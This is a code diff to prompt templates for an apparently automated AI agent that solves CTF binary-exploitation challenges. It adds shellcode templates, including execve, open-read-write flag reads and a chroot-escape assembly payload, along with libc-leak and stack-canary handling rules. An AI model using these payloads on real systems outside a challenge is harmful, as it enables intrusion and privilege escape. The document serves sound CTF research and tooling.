@@ -1175,7 +1175,7 @@ Common causes:
 - Wrong leak offset (leaked 0x0 → check bytes received, recvuntil pattern)
 - Wrong buffer offset to RIP (check with Pwndbg cyclic)
 - Wrong I/O interaction (check sendlineafter prompts match exactly)
-- Wrong libc base calculation (verify leaked symbol offset)
+- Wrong libc base calculation (verify leaked symbol offset; use full 8-byte leak, not 6)
 {% endif %}
 
 ---
@@ -1435,7 +1435,18 @@ Use `Store.knowledge.get_heap_techniques(version)` for version-specific techniqu
 ### Phase 4: DYNAMIC VERIFICATION (REQUIRED)
 **Goal: Verify ALL assumptions with GDB before exploit generation**
 
-**DO NOT skip this phase.** Static analysis alone produces wrong offsets, wrong addresses, and failed exploits. Every assumption MUST be verified dynamically.
+**DO NOT skip this phase** — unless one of the following exceptions applies.
+
+**⚡ Skip Phase 4 entirely when ALL of these hold:**
+1. **NX is disabled** (shellcode injection strategy — no ROP, no ret2libc)
+2. **No canary** (no stack cookie to leak or verify)
+3. **No PIE** (binary base is fixed, no ASLR on binary)
+
+When these three conditions hold, dynamic offsets and GDB stack inspection are unnecessary.
+The shellcode size limit is already extracted in Phase 1 (`shellcode_size_limit` in facts).
+Proceed directly to Phase 5 (exploit generation) — no GDB tasks needed.
+
+**In all other cases:** Static analysis alone produces wrong offsets, wrong addresses, and failed exploits. Every assumption MUST be verified dynamically.
 
 | Priority | Task | Tool |
 |----------|------|------|
@@ -1498,6 +1509,15 @@ Use `Store.knowledge.get_heap_techniques(version)` for version-specific techniqu
 5. Then proceed with standard BOF
 ```
 
+### Pattern D: Shellcode Injection (NX disabled, no canary, no PIE)
+```
+1. Checksec → NX disabled, No canary, No PIE
+2. Ghidra_main → finds mmap()+read() or read(0, buf, N) to executable buffer
+3. Shellcode size limit = N (auto-extracted in Phase 1, see facts.shellcode_size_limit)
+4. SKIP Phase 4 — no GDB needed, no offsets to verify
+5. READY: send shellcode ≤ N bytes to the executable buffer → shell or ORW flag
+```
+
 ---
 
 ## Task Priority Guidelines
@@ -1521,6 +1541,7 @@ These apply to ALL tasks you create. Creating a task that requires guessing will
 | **Libc offsets** | `system_offset = 0x52290` without computing from the provided libc | Run `one_gadget` / read symbols from the actual libc file |
 | **Canary position** | Assume canary is at `buf+64` | Verify with `x/gx $rbp-0x8` in GDB |
 | **PIE base** | Hardcode `0x555555554000` | Read from `vmmap` or `binary_base` in `dynamic_verification` |
+| **Canary index (OOB-read exploits)** | Hardcode `canary_at_index_23` or any fixed number | Compute from Ghidra: `canary_index = buf_rbp_offset - canary_rbp_offset`; e.g. buffer at RBP-0x1F, canary at RBP-0x10 → index = 0x1F − 0x10 = 15 |
 
 **Before creating any GDB task**, check `function_symbols` in the Analysis Document for actual function names.
 **Before creating any exploit task**, verify all offsets via GDB — static analysis estimates are STARTING POINTS, not final values.
@@ -2162,11 +2183,34 @@ hook_target = libc.address + one_gadget_offset
 # hook_target = libc.sym['system']
 ```
 
-### Rule 4: Shell Verification (NO p.interactive())
-**NEVER use `p.interactive()` at the end.** The exploit runs in a non-interactive subprocess.
-Instead, after triggering the shell, send `id` and verify the response:
+### Rule 4: All imports at the TOP of the file
+**NEVER place `import` statements inside functions or after executable code.**
+Python treats any variable with the same name as an `import` inside a function as local,
+causing `UnboundLocalError` if that name is used before the import line.
 ```python
-# After triggering shell (e.g., free → system("/bin/sh") or one_gadget)
+# CORRECT
+from pwn import *
+import time
+import struct
+
+def solve():
+    time.sleep(1)   # OK — time is a module-level name
+
+# WRONG — causes UnboundLocalError
+def solve():
+    p.recvuntil(b":")
+    import time       # too late — Python already treats 'time' as local
+    time.sleep(1)
+```
+This applies to ALL modules: `time`, `struct`, `sys`, `os`, etc.
+
+### Rule 5: Shell/Flag Verification (NO p.interactive())
+**NEVER use `p.interactive()` at the end.** The exploit runs in a non-interactive subprocess.
+
+Choose the verification pattern based on your exploit type:
+
+**Type A — Shell execution** (execve/system("/bin/sh"), one_gadget):
+```python
 import time
 time.sleep(0.5)
 p.sendline(b'id')
@@ -2180,8 +2224,52 @@ else:
     print(response.decode(errors='ignore'))
 p.close()
 ```
-This is MANDATORY. The automated verifier checks for `SHELL_VERIFIED` or `uid=\\d+` in the output.
+
+**Type B — ORW / flag-read shellcode** (open→read→write flag to stdout, no shell):
+```python
+import time
+time.sleep(0.5)
+{% set _flag_fmt = challenge.flag_format if (challenge and challenge.flag_format) else '' %}{% set _fp = (_flag_fmt.split('{')[0] ~ '{') if ('{' in _flag_fmt) else '' %}
+FLAG_PATTERNS = [b'uid='{% if _fp and _fp != '{' %}, b'{{ _fp }}'{% endif %}, b'flag{', b'CTF{', b'picoCTF{']
+response = p.recvrepeat(timeout=3)
+if any(pat in response for pat in FLAG_PATTERNS):
+    print('SHELL_VERIFIED')
+    print(response.decode(errors='ignore'))
+else:
+    print('SHELL_FAILED')
+    print(response.decode(errors='ignore'))
+p.close()
+```
+
+Use **Type A** when you get a shell (can run arbitrary commands).
+Use **Type B** when shellcode directly reads and writes the flag (ORW, chroot escape, etc.) — do NOT send `id` in this case.
+This is MANDATORY. The automated verifier checks for `SHELL_VERIFIED` in the output.
 Do NOT use `p.interactive()` — it hangs the subprocess and causes timeout.
+
+### Rule 6: Libc Leak Reception — Do NOT use recvuntil(b"\\x7f")
+**NEVER use `p.recvuntil(b"\\x7f")` to detect a libc address.**
+On modern x86-64 systems, libc is loaded by the kernel's ASLR into the mmap region
+`[0x10000000000, 0x7ff000000000)`. Traditional "0x7f..." addresses are common on native
+Linux, but on **WSL2, Docker, and many VMs** glibc may be mapped at 0x7bc..., 0x73e...,
+0x72d..., etc. — none of which contain a `0x7f` byte — so `recvuntil(b"\\x7f")` hangs or
+reads garbage.
+
+**Always use one of these safe patterns instead:**
+```python
+# Pattern A — newline-terminated output (puts, printf with \\n):
+p.recvuntil(b'\\n')          # consume prompt/garbage line
+leak_raw = p.recvuntil(b'\\n', drop=True)   # puts() null-terminates → newline after addr
+leaked = u64(leak_raw.ljust(8, b'\\x00'))
+
+# Pattern B — fixed-size recv (when you know puts() will output exactly 6-8 bytes):
+leak_raw = p.recv(6)         # puts() strips trailing null, so 6 bytes for most libc addrs
+leaked = u64(leak_raw.ljust(8, b'\\x00'))
+
+# Validate: must fall in user-space shared-lib range (covers WSL2/Docker/native):
+assert 0x10000000000 <= leaked < 0x7ff000000000, f"Bad leak: {hex(leaked)}"
+libc.address = leaked - libc.sym['puts']
+```
+Do NOT check `leaked > 0x7f0000000000` — this rejects valid WSL2/Docker libc addresses.
 
 ## Output Format (STRICT JSON)
 ```json
@@ -2204,10 +2292,12 @@ Do NOT use `p.interactive()` — it hangs the subprocess and causes timeout.
 
 ```python
 from pwn import *
+import os
 context.log_level = 'debug'
 
-context.binary = elf = ELF('{{ binary_path }}')
-libc = ELF('./libc.so.6')  # or libc = elf.libc
+context.binary = elf = ELF('{{ patched_binary or binary_path }}')
+# Libc: use only the file in the same directory as the script (Docker-extracted libc). No absolute path or host fallback (/lib/.../libc.so.6).
+libc = ELF(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libc.so.6'))
 
 def solve():
     p = process(context.binary.path)
@@ -2229,9 +2319,11 @@ def solve():
     )
     p.sendline(payload)
 
-    # Parse leaked address
-    p.recvuntil(b'\\n')  # 필요시 조정
-    leaked = u64(p.recv(6).ljust(8, b'\\x00'))
+    # Parse leaked address — DO NOT use recvuntil(b"\\x7f"): on WSL2/Docker libc may be at
+    # 0x7bc.../0x73e.../0x72d... (no 0x7f byte). Use recvuntil(b"\\n") and extract 6 bytes.
+    leak_raw = p.recvuntil(b'\\n', drop=True)   # puts() null-terminated → newline after addr
+    leaked = u64(leak_raw[-6:].ljust(8, b'\\x00'))  # take last 6 bytes (strips any leading output)
+    assert 0x10000000000 <= leaked < 0x7ff000000000, f"Bad libc leak: {hex(leaked)}"
     log.info(f"Leaked puts: {hex(leaked)}")
 
     # Calculate libc base
@@ -2255,6 +2347,22 @@ def solve():
 ### Case 2: No Canary + No PIE + NX Disabled
 **Strategy: Shellcode injection**
 
+**CRITICAL — Choose shellcode type based on binary analysis:**
+
+| Binary Behavior | Shellcode Type | Verification |
+|---|---|---|
+| No restrictions | `shellcraft.sh()` execve | Type A (send `id`, check `uid=`) |
+| seccomp blocks execve | ORW: open→read→write flag | Type B (check flag pattern) |
+| `chroot()` without `chdir()` | chroot escape + ORW | Type B (check flag pattern) |
+| `chroot()` + seccomp | chroot escape + ORW | Type B (check flag pattern) |
+| Shellcode size limit | Compact inline asm | Match type above |
+
+**How to detect:**
+- Look for `prctl(PR_SET_SECCOMP)` or `seccomp()` calls → seccomp present → use ORW
+- Look for `chroot()` call WITHOUT a following `chdir("/")` → chroot escape needed
+- Check `read(0, buf, N)` size limit → N is your shellcode byte limit
+
+**Template A — Standard execve (no restrictions):**
 ```python
 from pwn import *
 context.log_level = 'debug'
@@ -2265,19 +2373,84 @@ context.arch = 'amd64'  # or 'i386'
 def solve():
     p = process(context.binary.path)
 
-    # Generate shellcode
     shellcode = asm(shellcraft.sh())
 
     # Find buffer address (use GDB or known bss/stack address)
     buf_addr = 0x404000  # .bss or stack address
 
-    # Payload: shellcode + padding + return to shellcode
     payload = shellcode
     payload += b'A' * (OFFSET - len(shellcode))
     payload += p64(buf_addr)
 
     p.sendline(payload)
-    p.interactive()
+    # Verify with Type A (uid=)
+```
+
+**Template B — ORW shellcode (seccomp/chroot, flag at /flag):**
+```python
+from pwn import *
+context.log_level = 'debug'
+
+context.binary = elf = ELF('{{ binary_path }}')
+context.arch = 'amd64'
+
+def solve():
+    p = process(context.binary.path)
+
+    # ORW: open("/flag", O_RDONLY) → read → write to stdout
+    shellcode = asm(shellcraft.open('/flag', 0) +
+                    shellcraft.read('rax', 'rsp', 0x100) +
+                    shellcraft.write(1, 'rsp', 'rax'))
+
+    p.sendafter(b'shellcode', shellcode)
+    # Verify with Type B (flag pattern)
+```
+
+**Template C — chroot escape + ORW (chroot without chdir):**
+```python
+from pwn import *
+context.log_level = 'debug'
+
+context.binary = elf = ELF('{{ binary_path }}')
+context.arch = 'amd64'
+
+def solve():
+    p = process(context.binary.path)
+
+    # The binary calls chroot(jail) without chdir().
+    # Server CWD is real "/" → chroot(".") restores real root.
+    # Then open/read/write the flag directly.
+    shellcode = asm('''
+        push 0x2e
+        mov rdi, rsp
+        xor eax, eax
+        mov al, 161
+        syscall
+        mov rax, 0x00000067616c662f
+        push rax
+        mov rdi, rsp
+        xor esi, esi
+        xor eax, eax
+        mov al, 2
+        syscall
+        mov rdi, rax
+        sub rsp, 0x100
+        mov rsi, rsp
+        push 0x100
+        pop rdx
+        xor eax, eax
+        syscall
+        mov rdx, rax
+        push 1
+        pop rdi
+        xor eax, eax
+        inc eax
+        syscall
+    ''')
+    assert len(shellcode) <= SIZE_LIMIT, f"Shellcode too large: {len(shellcode)}"
+
+    p.sendafter(b'shellcode', shellcode)
+    # Verify with Type B (flag pattern)
 ```
 
 ### Case 3: Canary + No PIE + NX Enabled
@@ -2477,7 +2650,13 @@ def solve():
 ## Exploit Code Guidelines
 - Use pwntools (`from pwn import *`)
 - **MANDATORY: `context.log_level = 'debug'`** — must be at the top of every exploit (right after imports) for I/O tracing
-- **CRITICAL: Use ABSOLUTE paths for binary** - `context.binary = '{{ binary_path }}'`
+{% if patched_binary %}
+- **CRITICAL: Use PATCHED binary** - `context.binary = ELF('{{ patched_binary }}')`
+  - The patched binary loads the correct libc (`{{ patched_binary }}`). Always use this path for both `ELF()` and `process()`.
+  - `process(context.binary.path)` will automatically use the patched binary.
+{% else %}
+- **CRITICAL: Use ABSOLUTE paths for binary** - `context.binary = ELF('{{ binary_path }}')`
+{% endif %}
 - Include logging (`log.info`, `log.success`)
 - Add comments explaining each step
 {% if docker_port %}
@@ -2490,7 +2669,7 @@ def solve():
   ```
   **NEVER use `p = process(...)` in Docker mode.**
 {% else %}
-- **DEFAULT: Use process() for local testing** - pwninit has patched the binary!
+- **DEFAULT: Use process() for local testing**
 - Connection pattern:
   ```python
   import os
@@ -3228,7 +3407,7 @@ Only add Stage {{ current_stage.stage_index + 1 }} logic AFTER the verified code
 
 The Analysis Document contains a **"Dynamic Verification (Pwndbg/GDB)"** section with
 runtime-verified offsets extracted by GDB. **If `verified: true`, use these values DIRECTLY
-— do NOT recompute or estimate them:**
+— do NOT recompute, estimate, or replace them.** Never overwrite `buf_offset_to_canary` or `buf_offset_to_ret` with different numbers when they are already verified.
 
 | Field | How to use in exploit |
 |-------|-----------------------|
@@ -3262,6 +3441,12 @@ p.send(payload)
 **If `verified: false` or section says "NOT YET DONE":** use static estimates from decompile only
 as a starting point — but request dynamic verification via Pwndbg before finalizing.
 
+## Generic I/O and leak rules (apply to any binary)
+
+- **Banner / prompt sync:** If the binary prints a fixed string before accepting input (e.g. "hello world :)", "Input: ", menu text), you MUST consume it before sending payload and before parsing leaks. Use `p.recvuntil(b'<exact_bytes>')` (or the exact string from decompilation/analysis) so that the next `recv`/`recvline`/`recvn` reads the actual leak, not the prompt. Otherwise the "canary" or "leak" will be ASCII text and validation will fail.
+- **Canary validation:** The leaked canary must have LSB = 0x00 and must NOT be in stack range (>= 0x7ff000000000). If your leak looks like 0x7ffe... or printable ASCII (e.g. "hello"), you are reading the wrong offset or not using recvuntil; fix the offset and I/O order.
+- **Verified offsets only:** When the Analysis Document has verified `buf_offset_to_canary` and/or `buf_offset_to_ret`, use those exact numbers. Do not substitute different indices (e.g. 23 when verified value is 15).
+
 {% if confirmed and (confirmed.win_offset or confirmed.symbols or confirmed.oob_got_info) %}
 ## Confirmed Values from Analysis (USE DIRECTLY — do not guess)
 
@@ -3294,6 +3479,9 @@ as a starting point — but request dynamic verification via Pwndbg before final
 {% if confirmed.buffer_size is defined %}
 | buffer_size | {{ confirmed.buffer_size }} |
 {% endif %}
+{% if confirmed.shellcode_size_limit is defined %}
+| **shellcode size limit** | **{{ confirmed.shellcode_size_limit }} bytes (0x{{ "%x" | format(confirmed.shellcode_size_limit) }})** — do NOT send more bytes than this |
+{% endif %}
 {% endif %}
 {% if has_hook_overwrite %}
 ## Hook/GOT Overwrite — Trigger Flow
@@ -3321,6 +3509,22 @@ When overwriting a function pointer (GOT entry, vtable, hook), the overwritten f
 4. **EXACT I/O strings**: Use strings from the decompiled code or source code, NEVER guess. `recvuntil(b"Enter: ")` when the binary doesn't print "Enter: " will hang forever.
 5. **Prefer one_gadget** over system for hook overwrites (simpler).
 6. **NEVER use p.interactive()**: Hangs the subprocess.
+7. **Libc path**: Always load libc with `os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libc.so.6')` so the script finds the Docker-extracted libc regardless of CWD. Do NOT use absolute paths or host fallback (e.g. `/lib/x86_64-linux-gnu/libc.so.6`).
+8. **All `import` statements at the TOP of the file**, never inside functions.
+9. **Buffer flush between stages**: After a ROP chain triggers a re-entry (e.g. jumps back to main),
+   ALL pending output from the previous stage must be drained before the next stage reads anything.
+   ```python
+   # At the start of Stage 2+ (after Stage 1 ROP lands):
+   p.clean(timeout=0.5)   # drain leftover Stage 1 output
+   # NOW start Stage 2 I/O
+   ```
+   Skipping this causes Stage 2 to read stale Stage 1 data — e.g. a stack address that looks like
+   a libc address (0x7ffc...) being mistaken for a real libc leak.
+10. **Libc leak reception — do NOT use `recvuntil(b"\\x7f")`**: On WSL2/Docker/VM, glibc is
+    commonly mapped at 0x7bc..., 0x73e..., 0x72d... — none contain 0x7f — so the call hangs.
+    Use `recvuntil(b"\\n")` then extract 6 bytes, or `recv(6)` after a known delimiter.
+    Validate the leak with `0x10000000000 <= leaked < 0x7ff000000000` (covers all platforms).
+    Do NOT assert `leaked > 0x7f0000000000`.
 
 ## ⛔ NO-GUESSING RULES (exploit will timeout/crash if violated)
 
@@ -3332,6 +3536,8 @@ When overwriting a function pointer (GOT entry, vtable, hook), the overwritten f
 | **PIE base** | `pie_base = 0x555555554000` hardcoded | Compute from runtime leak or use `binary_base` from dynamic_verification |
 | **Canary position** | `canary = u64(p.recvn(7).ljust(8, b'\\x00'))` without I/O sync | `recvuntil(next_prompt)` then slice at `buf_offset_to_canary` |
 | **`recvuntil` after `read()`** | `p.recvuntil(b"length.\\r\\n")` when prompt is `"Target length: "` (no newline) | Use `sendlineafter(b"Target length: ", ...)` — `read()` prompt has NO newline |
+| **Canary index (OOB-read exploits)** | `canary_at_index_23` (hardcoded) | Compute: `buf_rbp_offset - canary_rbp_offset`; e.g. buffer at RBP-0x1F, canary at RBP-0x10 → index = 0x1F − 0x10 = 15 |
+| **Libc leak byte pattern** | `p.recvuntil(b"\\x7f")` to locate libc address | On WSL2/Docker libc may be at 0x7bc.../0x73e... (no 0x7f byte). Use `recvuntil(b"\\n")` + 6-byte extraction; validate `0x10000000000 <= leaked < 0x7ff000000000` |
 
 ## Connection Pattern (MANDATORY)
 {% if docker_port %}
@@ -3545,14 +3751,17 @@ print(f"<MARKER> canary=0x{canary:016x} pie_leak=0x{pie_base:x}")
 ```
 7. **End with verification:**
 {% if current_stage.verification_marker == "SHELL_VERIFIED" %}
-   After triggering shell:
+   After triggering shell/flag-read:
    ```python
    import time
    time.sleep(0.5)
-   p.sendline(b'id')
-   time.sleep(0.5)
-   response = p.recvrepeat(timeout=2)
-   if b'uid=' in response:
+   # Type A (shell): send id and check uid=
+   # Type B (ORW/flag-read): just recv and check flag pattern — do NOT send 'id'
+   # Choose based on your exploit type.
+   {% set _flag_fmt = challenge.flag_format if (challenge and challenge.flag_format) else '' %}{% set _fp = (_flag_fmt.split('{')[0] ~ '{') if ('{' in _flag_fmt) else '' %}
+   FLAG_PATTERNS = [b'uid='{% if _fp and _fp != '{' %}, b'{{ _fp }}'{% endif %}, b'flag{', b'CTF{', b'picoCTF{']
+   response = p.recvrepeat(timeout=3)
+   if any(pat in response for pat in FLAG_PATTERNS):
        print('SHELL_VERIFIED')
        print(response.decode(errors='ignore'))
    else:
@@ -3692,14 +3901,16 @@ The expected verification marker is: `{{ stage.verification_marker }}`
 ```
 {% if not base_code_snippet %}**exploit_code MUST include** `context.log_level = 'debug'` immediately after imports.{% endif %}
 
-CRITICAL: NEVER use p.interactive(). After triggering shell, verify with:
+CRITICAL: NEVER use p.interactive(). After triggering shell/flag-read, verify with:
 ```python
 import time
 time.sleep(0.5)
-p.sendline(b'id')
-time.sleep(0.5)
-response = p.recvrepeat(timeout=2)
-if b'uid=' in response:
+# Type A (shell — execve/system): send id first, check uid=
+# Type B (ORW/flag-read): skip sendline, just recv, check flag pattern
+{% set _flag_fmt = challenge.flag_format if (challenge and challenge.flag_format) else '' %}{% set _fp = (_flag_fmt.split('{')[0] ~ '{') if ('{' in _flag_fmt) else '' %}
+FLAG_PATTERNS = [b'uid='{% if _fp and _fp != '{' %}, b'{{ _fp }}'{% endif %}, b'flag{', b'CTF{', b'picoCTF{']
+response = p.recvrepeat(timeout=3)
+if any(pat in response for pat in FLAG_PATTERNS):
     print('SHELL_VERIFIED')
     print(response.decode(errors='ignore'))
 else:
@@ -3729,7 +3940,9 @@ Focus on:
 
 **Canary/PIE leak specific checks (if this is a leak stage):**
 - `p.recvn(N)` without first consuming full output → reads prompt text instead of canary → I/O desync.
-  Fix: use `p.recvuntil(b"<next_prompt>")` then slice at `buf_offset_to_canary`.
+  Fix: use `p.recvuntil(b"<exact_banner_or_prompt>")` then slice at the correct offset for canary/leak.
+- If canary=0x7ffe... or canary looks like ASCII (e.g. 0x6f6c6c6568 = "hello") → wrong offset or reading banner. Use verified buf_offset_to_canary and recvuntil before parsing.
+- Never use a different canary/ret offset when the Analysis Document has verified values (e.g. use 15 if verified, not 23).
 - Canary printed as ASCII (e.g. `0x72657474617...`) → bytes are printable → I/O desync confirmed.
   Validate: `sum(1 for b in canary.to_bytes(8,'little') if 0x20<=b<=0x7e) < 7`
 - Canary LSB ≠ 0x00 → wrong extraction. Stack canary always has `\x00` at lowest byte.
@@ -3794,6 +4007,13 @@ Focus on:
 - NEVER combine multiple inputs into one `p.send()` call
 - NEVER use `p.send(b"1 " + ...)` to combine menu + size + content
 
+{% if patched_binary %}
+**BINARY: Always use the patched binary** - `context.binary = ELF('{{ patched_binary }}')`
+The patched binary loads the correct libc. Do NOT use the original binary path.
+{% elif binary_path %}
+**BINARY: Use** `context.binary = ELF('{{ binary_path }}')`
+{% endif %}
+
 **DO NOT change the exploitation technique/strategy.**
 - If the stage description says "stdout BSS partial overwrite", keep that approach
 - If it says "unsorted bin leak", keep that approach
@@ -3804,11 +4024,13 @@ Focus on:
 
 Do NOT "fix" code by replacing known values with guesses. Every change must be justified by the error output or source/decompile.
 
+**Verified offsets (universal rule):** When the Analysis Document has `dynamic_verification` with `verified: true` and integer `buf_offset_to_canary` / `buf_offset_to_ret`, use those values exactly in the exploit. Do not replace them with other numbers (e.g. from decompile or static analysis) unless the error output or GDB output clearly proves a different offset.
+
 | Category | FORBIDDEN | CORRECT |
 |----------|-----------|---------|
 | **I/O prompt strings** | Changing `b"Pattern: "` to `b"Enter: "` without evidence | Keep exact string from source code. If the prompt string is wrong, find the ACTUAL string in source/decompile. |
 | **`recvuntil` for `scanf` prompts** | `p.recvuntil(b"Target length: \\n")` | `scanf` outputs "Target length: " with NO trailing newline/CR. Use `sendlineafter(b"Target length: ", ...)`. |
-| **Buffer offsets** | Changing `buf_offset_to_canary` to a random value | Only change if GDB output or error clearly shows a different offset. |
+| **Buffer offsets** | Changing `buf_offset_to_canary` / `buf_offset_to_ret` when already verified in Analysis | Keep the exact values from Analysis Document `dynamic_verification`. Only change if GDB or error output proves a different offset. |
 | **Win/function address** | Hardcoding a new address without evidence | Reuse `win_function_addr` from Analysis Document. |
 | **Adding `recvuntil` before `send`** | `p.recvuntil(b"length.\\r\\n")` when `read()` prompt has no newline | `read()` calls don't add newline. Check source: if prompt ends with `: ` (no `\\n`), don't use `recvuntil`-with-newline. |
 """)
@@ -3817,6 +4039,8 @@ Do NOT "fix" code by replacing known values with guesses. Every change must be j
 STAGE_REFINE_USER = env.from_string("""## Failing Stage: {{ stage.stage_id }} (Stage {{ stage.stage_index + 1 }})
 - Expected marker: `{{ stage.verification_marker }}`
 - Refinement attempt: {{ stage.refinement_attempts + 1 }}
+{% if stage.failure_type %}- Failure category: `{{ stage.failure_type }}`{% if stage.failure_type_history|length > 1 %} (repeated {{ stage.failure_type_history|length }} times){% endif %}
+{% endif %}
 
 ## Current Script (FAILED)
 ```python
@@ -3824,6 +4048,7 @@ STAGE_REFINE_USER = env.from_string("""## Failing Stage: {{ stage.stage_id }} (S
 ```
 
 ## Error Output (includes SHELL_FAILED output and CORE DUMP ANALYSIS when applicable)
+When CORE DUMP ANALYSIS is present, it was produced with the same binary used for dynamic analysis (patched binary if pwninit was run). Use it to fix offsets (e.g. buf_offset_to_ret) and re-run with that binary.
 ```
 {{ error_output[:8000] }}
 ```
@@ -4017,6 +4242,11 @@ def _extract_confirmed_analysis_values(state: SolverState) -> Dict[str, Any]:
         if v.get("buffer_size"):
             result.setdefault("buffer_size", v["buffer_size"])
 
+    # Shellcode size limit (from read(0, buf, N) detection in Phase 1)
+    shellcode_size = facts.get("shellcode_size_limit")
+    if shellcode_size:
+        result["shellcode_size_limit"] = shellcode_size
+
     return result
 
 
@@ -4044,6 +4274,7 @@ def build_stage_exploit_messages(
         verified_stages=verified_stages,
         challenge=state.get("challenge", {}),
         binary_path=state.get("binary_path", ""),
+        patched_binary=state.get("patched_binary", ""),
         docker_port=state.get("docker_port", 0),
         additions_only=additions_only,
         base_code_snippet=base_code_snippet,
@@ -4071,6 +4302,7 @@ def build_stage_exploit_messages(
     user_content = STAGE_EXPLOIT_USER.render(
         analysis_document=build_analysis_document(state),
         binary_path=state.get("binary_path", ""),
+        patched_binary=state.get("patched_binary", ""),
         io_patterns=analysis.get("io_patterns", []),
         decompiled_functions=analysis.get("decompile", {}).get("functions", []),
         current_stage=current_stage,
